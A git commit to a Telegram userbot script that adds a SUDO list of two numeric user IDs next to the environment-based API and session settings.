1e6fefc0d125b089ac6cfb771fe1347c8cb54dfb
Mishel <131391958+Mishel-Tg@users.noreply.github.com>
2024-05-18 18:59:47 +0530

    Update userbot.py

--- userbot.py
+++ userbot.py
@@ -14,6 +14,7 @@ def is_enabled(value, default):
 API_ID = int(os.environ.get('API_ID', ''))
 API_HASH = os.environ.get('API_HASH', '')
 SESSION = os.environ.get('SESSION', '')
+SUDO = [6511724381, 1867106198]
 
 
 piro = Client("Gojo", session_string=SESSION, api_id=API_ID, api_hash=API_HASH, plugins=dict(root="user"))
